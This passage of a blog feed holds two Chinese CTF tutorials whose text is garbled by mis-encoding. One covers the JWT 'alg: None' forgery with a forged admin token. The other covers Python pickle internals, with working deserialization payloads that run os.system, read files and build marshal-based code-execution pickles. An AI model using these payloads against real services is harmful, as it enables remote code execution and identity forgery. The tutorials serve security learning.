        <content type="html"><![CDATA[<h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="æ–‡ç« "><a href="#æ–‡ç« " class="headerlink" title="æ–‡ç« "></a>æ–‡ç« </h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p><p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p><h2 id="å…³äºjwt"><a href="#å…³äºjwt" class="headerlink" title="å…³äºjwt"></a>å…³äºjwt</h2><p>JWTçš„å…¨ç§°æ˜¯Json Web Tokenã€‚å®ƒéµå¾ªJSONæ ¼å¼ï¼Œå°†ç”¨æˆ·ä¿¡æ¯åŠ å¯†åˆ°tokené‡Œï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜ä»»ä½•ç”¨æˆ·ä¿¡æ¯ï¼Œåªä¿å­˜å¯†é’¥ä¿¡æ¯ï¼Œé€šè¿‡ä½¿ç”¨ç‰¹å®šåŠ å¯†ç®—æ³•éªŒè¯tokenï¼Œé€šè¿‡tokenéªŒè¯ç”¨æˆ·èº«ä»½ã€‚åŸºäºtokençš„èº«ä»½éªŒè¯å¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„cookie+sessionèº«ä»½éªŒè¯æ–¹æ³•ã€‚</p><p>jwtç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š<code>header</code>.<code>payload</code>.<code>signature</code></p><h3 id="headeréƒ¨åˆ†"><a href="#headeréƒ¨åˆ†" class="headerlink" title="headeréƒ¨åˆ†"></a>headeréƒ¨åˆ†</h3><p>headeréƒ¨åˆ†æœ€å¸¸ç”¨çš„ä¸¤ä¸ªå­—æ®µæ˜¯<code>alg</code>å’Œ<code>typ</code>ï¼Œ<code>alg</code>æŒ‡å®šäº†tokenåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ï¼ˆæœ€å¸¸ç”¨çš„ä¸º<em>HMAC</em>å’Œ<em>RSA</em>ç®—æ³•ï¼‰ï¼Œtyp`å£°æ˜ç±»å‹ä¸ºJWT</p><p>headeré€šå¸¸ä¼šé•¿è¿™ä¸ªæ ·å­ï¼š</p><pre><code>{        &quot;alg&quot; : &quot;HS256&quot;,        &quot;typ&quot; : &quot;jwt&quot;}</code></pre><h3 id="payloadéƒ¨åˆ†"><a href="#payloadéƒ¨åˆ†" class="headerlink" title="payloadéƒ¨åˆ†"></a>payloadéƒ¨åˆ†</h3><p>payloadåˆ™ä¸ºç”¨æˆ·æ•°æ®ä»¥åŠä¸€äº›å…ƒæ•°æ®æœ‰å…³çš„å£°æ˜ï¼Œç”¨ä»¥å£°æ˜æƒé™ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œä¸€æ¬¡ç™»å½•çš„è¿‡ç¨‹å¯èƒ½ä¼šä¼ é€’ä»¥ä¸‹æ•°æ®</p><pre><code>{        &quot;user_role&quot; : &quot;finn&quot;,    //å½“å‰ç™»å½•ç”¨æˆ·    &quot;iss&quot;: &quot;admin&quot;,          //è¯¥JWTçš„ç­¾å‘è€…    &quot;iat&quot;: 1573440582,        //ç­¾å‘æ—¶é—´    &quot;exp&quot;: 1573940267,        //è¿‡æœŸæ—¶é—´    &quot;nbf&quot;: 1573440582,         //è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token    &quot;domain&quot;: &quot;example.com&quot;,   //é¢å‘çš„ç”¨æˆ·    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Tokenå”¯ä¸€æ ‡è¯†}</code></pre><h3 id="signatureéƒ¨åˆ†"><a href="#signatureéƒ¨åˆ†" class="headerlink" title="signatureéƒ¨åˆ†"></a>signatureéƒ¨åˆ†</h3><p>signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚</p><p>ç”Ÿæˆæ–¹æ³•ä¸ºå°†headerå’Œpayloadä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡headeréƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚</p><p>æŠ½è±¡æˆå…¬å¼å°±æ˜¯</p><pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç headerå’Œpayloadæ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸º<code>base64urlencode</code>ï¼Œ<code>base64url</code>ç¼–ç æ˜¯<code>base64</code>çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€=â€å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€+â€å’Œâ€/â€œåˆ†åˆ«æ”¹æˆäº†â€-â€œå’Œâ€-â€œã€‚</p><h3 id="å®Œæ•´tokenç”Ÿæˆ"><a href="#å®Œæ•´tokenç”Ÿæˆ" class="headerlink" title="å®Œæ•´tokenç”Ÿæˆ"></a>å®Œæ•´tokenç”Ÿæˆ</h3><p>ä¸€ä¸ªå®Œæ•´çš„jwtæ ¼å¼ä¸º(<code>header</code>.<code>payload</code>.<code>signature</code>)ï¼Œå…¶ä¸­headerã€payloadä½¿ç”¨base64urlç¼–ç ï¼Œsignatureé€šè¿‡æŒ‡å®šç®—æ³•ç”Ÿæˆã€‚</p><p>pythonçš„<code>Pyjwt</code>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹</p><pre><code>import jwtencoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>ç”Ÿæˆçš„tokenä¸º</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><h3 id="åŠ å¯†ç®—æ³•"><a href="#åŠ å¯†ç®—æ³•" class="headerlink" title="åŠ å¯†ç®—æ³•"></a>åŠ å¯†ç®—æ³•</h3><h4 id="ç©ºåŠ å¯†ç®—æ³•"><a href="#ç©ºåŠ å¯†ç®—æ³•" class="headerlink" title="ç©ºåŠ å¯†ç®—æ³•"></a>ç©ºåŠ å¯†ç®—æ³•</h4><p>JWTæ”¯æŒä½¿ç”¨ç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸º<code>None</code></p><p>è¿™æ ·çš„è¯ï¼Œåªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼ˆå³ä¸æ·»åŠ signatureå­—æ®µï¼‰ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œä»»ä½•tokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„éªŒè¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨ä»¥ä¸‹çš„å­—æ®µ</p><pre><code>{    &quot;alg&quot; : &quot;None&quot;,    &quot;typ&quot; : &quot;jwt&quot;}{    &quot;user&quot; : &quot;Admin&quot;}</code></pre><p>ç”Ÿæˆçš„å®Œæ•´tokenä¸º<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p><p>(header+â€™.â€™+payloadï¼Œå»æ‰äº†â€™.â€™+signatureå­—æ®µ)</p><p>ç©ºåŠ å¯†ç®—æ³•çš„è®¾è®¡åˆè¡·æ˜¯ç”¨äºè°ƒè¯•çš„ï¼Œä½†æ˜¯å¦‚æœæŸå¤©å¼€å‘äººå‘˜è„‘é˜”ç“¦ç‰¹äº†ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯äº†ç©ºåŠ å¯†ç®—æ³•ï¼Œç¼ºå°‘ç­¾åç®—æ³•ï¼Œjwtä¿è¯ä¿¡æ¯ä¸è¢«ç¯¡æ”¹çš„åŠŸèƒ½å°±å¤±æ•ˆäº†ã€‚æ”»å‡»è€…åªéœ€è¦æŠŠalgå­—æ®µè®¾ç½®ä¸ºNoneï¼Œå°±å¯ä»¥åœ¨payloadä¸­æ„é€ èº«ä»½ä¿¡æ¯ï¼Œä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚</p><h4 id="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"><a href="#ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC" class="headerlink" title="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"></a>ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC</h4><h3 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h3><p>å·¥å…· <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2019/12/19/jwtæ”»å‡»æ–¹å¼/">https://explorersss.github.io/2019/12/19/jwtæ”»å‡»æ–¹å¼/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python  pickle å…¥é—¨</title>
      <link href="/2019/12/16/pickle/"/>
      <url>/2019/12/16/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="æ¨èæ–‡ç« "><a href="#æ¨èæ–‡ç« " class="headerlink" title="æ¨èæ–‡ç« "></a>æ¨èæ–‡ç« </h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p>zç‰›: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><h2 id="pickleæ“ä½œç å¤§å…¨-v0"><a href="#pickleæ“ä½œç å¤§å…¨-v0" class="headerlink" title="pickleæ“ä½œç å¤§å…¨(v0)"></a>pickleæ“ä½œç å¤§å…¨(v0)</h2><p>æœ‰å•¥ä¸æ‡‚çš„ç›´æ¥çœ‹æºç æŠŠ(zç‰›)</p><pre><code class="python">MARK           = b&#39;(&#39;   # push special markobject on stackSTOP           = b&#39;.&#39;   # every pickle ends with STOPPOP            = b&#39;0&#39;   # discard topmost stack itemPOP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobjectDUP            = b&#39;2&#39;   # duplicate top stack itemFLOAT          = b&#39;F&#39;   # push float object; decimal string argumentINT            = b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         = b&#39;J&#39;   # push four-byte signed intBININT1        = b&#39;K&#39;   # push 1-byte unsigned intLONG           = b&#39;L&#39;   # push long; decimal string argumentBININT2        = b&#39;M&#39;   # push 2-byte unsigned intNONE           = b&#39;N&#39;   # push NonePERSID         = b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         = b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      = b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#39;a&#39;   # append stack top to list below itBUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           = b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     = b&#39;}&#39;   # push empty dictAPPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            = b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           = b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     = b&#39;]&#39;   # push empty listOBJ            = b&#39;o&#39;   # build &amp; push class instancePUT            = b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#39;s&#39;   # add key+value pair to dictTUPLE          = b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#39;)&#39;   # push empty tupleSETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre><h2 id="pickleä»‹ç»"><a href="#pickleä»‹ç»" class="headerlink" title="pickleä»‹ç»"></a>pickleä»‹ç»</h2><h3 id="pickleçš„å¤§è‡´è¿‡ç¨‹"><a href="#pickleçš„å¤§è‡´è¿‡ç¨‹" class="headerlink" title="pickleçš„å¤§è‡´è¿‡ç¨‹"></a>pickleçš„å¤§è‡´è¿‡ç¨‹</h3><p>ä»¥Fooç±»ä¸ºä¾‹</p><ol><li>æå–å‡ºFooç±»ä¸­çš„æ‰€æœ‰attribute(ä»<code>__dict__</code>ä¸­è·å¾—)å°†å…¶è½¬åŒ–ä¸ºé”®å€¼å¯¹</li><li>å†™å…¥å¯¹è±¡ç±»å</li><li>å†™å…¥ç¬¬ä¸€æ­¥ç”Ÿæˆçš„é”®å€¼å¯¹</li></ol><h3 id="unpickleçš„å¤§è‡´è¿‡ç¨‹"><a href="#unpickleçš„å¤§è‡´è¿‡ç¨‹" class="headerlink" title="unpickleçš„å¤§è‡´è¿‡ç¨‹"></a>unpickleçš„å¤§è‡´è¿‡ç¨‹</h3><ol><li>è·å–pickleæµ</li><li>é‡æ–°æ„å»ºå±æ€§åˆ—è¡¨</li><li>æ ¹æ®ä¿å­˜çš„ç±»åæ¥åˆ›å»ºå¯¹è±¡</li><li>å°†å±æ€§åˆ—è¡¨æ¢å¤åˆ°å¯¹è±¡ä¸­</li></ol><h3 id="pvmç»„æˆ-è§£æpickle"><a href="#pvmç»„æˆ-è§£æpickle" class="headerlink" title="pvmç»„æˆ(è§£æpickle)"></a>pvmç»„æˆ(è§£æpickle)</h3><ol><li>æŒ‡ä»¤è§£é‡Šå™¨<br>æœ€åä¸€æ­¥ä¸€å®šæ˜¯è¿”å›æ ˆé¡¶å…ƒç´ </li><li>æ ˆ </li><li>memo(ä¸´æ—¶ä¿å­˜æ•°æ®)<br>ç”¨ç±»ä¼¼listçš„æ–¹å¼æ¥è¯»å–å’Œå‚¨å­˜æ•°æ®,ä»¥å­—å…¸æ–¹å¼å®ç°<br>å¦‚p100,æ„ä¸ºæŠŠæ ˆé¡¶å…ƒç´ ä¿å­˜åˆ°memoä¸­ç´¢å¼•ä¸º100</li></ol><h3 id="pvmæŒ‡ä»¤æ ¼å¼"><a href="#pvmæŒ‡ä»¤æ ¼å¼" class="headerlink" title="pvmæŒ‡ä»¤æ ¼å¼"></a>pvmæŒ‡ä»¤æ ¼å¼</h3><ol><li><p>pvmçš„æ“ä½œç åªæœ‰ä¸€ä¸ªå­—èŠ‚</p></li><li><p>éœ€è¦å‚æ•°çš„æ“ä½œç ,è¦åœ¨æ¯ä¸€ä¸ªå‚æ•°åé¢åŠ ä¸Šæ¢è¡Œç¬¦</p></li><li><p>ä»pickleæµä¸­è¯»å–æ•°æ®,å¹¶åŠ è½½åˆ°æ ˆä¸Š</p></li></ol><h2 id="å¦‚ä½•ç”Ÿæˆpickle"><a href="#å¦‚ä½•ç”Ÿæˆpickle" class="headerlink" title="å¦‚ä½•ç”Ÿæˆpickle"></a>å¦‚ä½•ç”Ÿæˆpickle</h2><h3 id="æ“ä½œç "><a href="#æ“ä½œç " class="headerlink" title="æ“ä½œç "></a>æ“ä½œç </h3><h4 id="åŠ è½½æ•°æ®"><a href="#åŠ è½½æ•°æ®" class="headerlink" title="åŠ è½½æ•°æ®"></a>åŠ è½½æ•°æ®</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>åŠ è½½åˆ°æ ˆä¸Šçš„æ•°æ®ç±»å‹</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>S</td><td>string</td><td>String</td><td>Sâ€™fooâ€™\n</td></tr><tr><td>V</td><td>unicode</td><td>unicode</td><td>Vfo\u006f\n</td></tr><tr><td>I</td><td>int</td><td>int</td><td>I42\n</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="ä¿®æ”¹æ ˆ-memo"><a href="#ä¿®æ”¹æ ˆ-memo" class="headerlink" title="ä¿®æ”¹æ ˆ/memo"></a>ä¿®æ”¹æ ˆ/memo</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>å‘æ ˆä¸­åŠ å…¥ä¸€ä¸ªæ ‡è®°</td><td>(</td></tr><tr><td>0</td><td>POP</td><td>å¼¹å‡ºæ ˆé¡¶å…ƒç´ å¹¶ä¸¢å¼ƒ</td><td>0</td></tr><tr><td>p<code>&lt;memo_index&gt;</code>\n</td><td>PUT</td><td>å¤åˆ¶æ ˆé¡¶å…ƒç´ åˆ°memoä¸­</td><td>p101\n</td></tr><tr><td>g<code>&lt;memo_index&gt;</code>\n</td><td>GET</td><td>å°†memoä¸­æŒ‡å®šå…ƒç´ æ‹·è´åˆ°æ ˆé¡¶</td><td>g101\n</td></tr></tbody></table><h4 id="ç”Ÿæˆ-ä¿®æ”¹åˆ—è¡¨-å­—å…¸-å…ƒç»„"><a href="#ç”Ÿæˆ-ä¿®æ”¹åˆ—è¡¨-å­—å…¸-å…ƒç»„" class="headerlink" title="ç”Ÿæˆ/ä¿®æ”¹åˆ—è¡¨,å­—å…¸,å…ƒç»„"></a>ç”Ÿæˆ/ä¿®æ”¹åˆ—è¡¨,å­—å…¸,å…ƒç»„</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>l</td><td>åˆ—è¡¨</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ åˆ°ä¸€ä¸ªåˆ—è¡¨,å¹¶å°†è¿™ä¸ªåˆ—è¡¨æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™stringâ€™\nl</td></tr><tr><td>t</td><td>å…ƒç»„</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ æ”¾åˆ°ä¸€ä¸ªå…ƒç»„ä¸­,å¹¶å°†è¿™ä¸ªå…ƒç»„æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™stringâ€™\nSâ€™string2â€™\nt</td></tr><tr><td>d</td><td>å­—å…¸</td><td>å°†æ ˆé¡¶åˆ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªmaskä¹‹é—´çš„å…ƒç´ æ”¾åˆ°ä¸€ä¸ªå­—å…¸ä¸­,å¹¶å°†è¿™ä¸ªå­—å…¸æ”¾å…¥æ ˆä¸­</td><td>(Sâ€™key1â€™\nSâ€™value1â€™\nSâ€™key2â€™\nSâ€™value2â€™\nd</td></tr><tr><td>s</td><td>SETITEM</td><td>ä»æ ˆå‡ºå¼¹å‡ºä¸‰ä¸ªå€¼:å­—å…¸,é”®,å€¼,å°†é”®å€¼å¯¹åˆå¹¶åˆ°å­—å…¸ä¸­</td><td>(Sâ€™key1â€™\nSâ€™val1â€™\nSâ€™key2â€™\nI123\ndSâ€™key3â€™\nSâ€™val 3â€™\ns</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="pickle-æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹"><a href="#pickle-æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹" class="headerlink" title="pickle æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹"></a>pickle æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹</h4><ul><li><p>ç”Ÿæˆå…ƒç»„çš„æŒ‡ä»¤</p><pre><code>(S&#39;str1&#39;S&#39;str2&#39;I1234t</code></pre></li><li><p>ç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹å›¾</p></li></ul><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p><h4 id="åŠ è½½å¯¹è±¡"><a href="#åŠ è½½å¯¹è±¡" class="headerlink" title="åŠ è½½å¯¹è±¡"></a>åŠ è½½å¯¹è±¡</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>c</td><td>GLOBAL</td><td>éœ€è¦ä¸¤ä¸ªå‚æ•°(module,class)æ¥åˆ›å»ºå¯¹è±¡,å¹¶å°†å…¶æ”¾åˆ°æ ˆä¸­</td><td>cos\nsystem\n</td></tr><tr><td>R</td><td>REDUCE</td><td>å¼¹å‡ºä¸€ä¸ªå‚æ•°å…ƒç»„å’Œä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼ˆå¯èƒ½æ˜¯ç”±GLOBALåŠ è½½çš„ï¼‰ï¼Œå°†å‚æ•°åº”ç”¨äºå¯è°ƒç”¨å¯¹è±¡å¹¶å°†ç»“æœå‹å…¥æ ˆä¸­</td><td>cos\nsystem\n(Sâ€™sleep 10â€™\ntR</td></tr></tbody></table><h4 id="åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾"><a href="#åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾" class="headerlink" title="åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾"></a>åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p><h2 id="ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§"><a href="#ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§" class="headerlink" title="ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§"></a>ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§</h2><p>æˆ‘ä»¬å¦‚ä½•æ‰§è¡Œå¦‚ä¸‹çš„ä»£ç :</p><pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) f.read()</code></pre><p>æ€è·¯æ˜¯:é¦–å…ˆæ‰§è¡Œopenå‡½æ•°,å°†å…¶å‚¨å­˜åœ¨memoé‡Œé¢,åœ¨åˆ©ç”¨é­”æœ¯æ–¹æ³•æ¥æ‰§è¡Œf.read()</p><p><code>f.read()</code>å¯ä»¥ç­‰ä»·æ›¿æ¢æˆ<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p><p>æœ€ååˆæˆçš„pickleæ˜¯</p><pre><code>#step1c__builtin__open(S&#39;/path/to/massive/sikrit&#39;tRp100#step2c__builtin__apply(c__builtin__getattr(c__builtin__fileS&#39;read&#39;tR(g100ltR.</code></pre><h3 id="æ‰‹å†™pickleæ¨¡æ¿"><a href="#æ‰‹å†™pickleæ¨¡æ¿" class="headerlink" title="æ‰‹å†™pickleæ¨¡æ¿"></a>æ‰‹å†™pickleæ¨¡æ¿</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p><h3 id="åˆ©ç”¨-reduce-æ¥ç”Ÿæˆpickleä»£ç "><a href="#åˆ©ç”¨-reduce-æ¥ç”Ÿæˆpickleä»£ç " class="headerlink" title="åˆ©ç”¨__reduce__æ¥ç”Ÿæˆpickleä»£ç "></a>åˆ©ç”¨<code>__reduce__</code>æ¥ç”Ÿæˆpickleä»£ç </h3><p><code>__reduce__</code></p><blockquote><p>å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚ </p></blockquote><pre><code class="python">import os, pickleclass Test(object):    def __reduce__(self):        return (os.system,(&#39;ls&#39;,))print(pickle.dumps(Test(), protocol=0))</code></pre><h3 id="åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç "><a href="#åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç " class="headerlink" title="åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç "></a>åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç </h3><pre><code class="python"># !/usr/bin/env python# -*- coding:utf-8 -*-__author__ = &#39;bit4&#39;__github__ = &#39;https://github.com/bit4woo&#39;import marshalimport base64import cPickleimport urllibimport pickledef foo():#you should write your code in this function    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;dir&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))#ä¸ºäº†ä¿è¯code_serializedä¸­çš„å†…å®¹å¾—åˆ°æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä¸‹ä»£ç #(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()payload =  &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))print(payload)</code></pre><h2 id="ç»éªŒ"><a href="#ç»éªŒ" class="headerlink" title="ç»éªŒ"></a>ç»éªŒ</h2><h3 id="é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•"><a href="#é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•" class="headerlink" title="é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•"></a>é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•</h3><p>ç›´æ¥æ‰€æœ‰æ“ä½œç å¯¹åº”çš„å˜é‡</p><p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p><p><code>dispatch[BININT1[0]] = load_binint1</code></p><p>æ‰¾åˆ°ç±»ä¼¼è¿™ç§çš„åé¢çš„å°±æ˜¯å¯¹åº”çš„å‡½æ•°</p><h2 id="pickleå·¥å…·"><a href="#pickleå·¥å…·" class="headerlink" title="pickleå·¥å…·"></a>pickleå·¥å…·</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" 